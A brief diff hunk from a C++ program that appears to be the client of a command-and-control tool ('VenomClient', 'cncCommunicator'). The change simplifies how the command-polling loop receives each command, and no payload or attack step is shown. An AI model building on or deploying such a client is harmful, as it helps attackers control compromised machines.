@@ -26,7 +26,7 @@ int main(int argc, const char* argv[]) {
 
 		while (true)
 		{
-			cncCommunicator.pullCommand((char*)&recievedCommand, VenomClient::commandLength);
+			cncCommunicator.pullCommand(&recievedCommand);
 			
 			switch (recievedCommand.commandType)
 			{
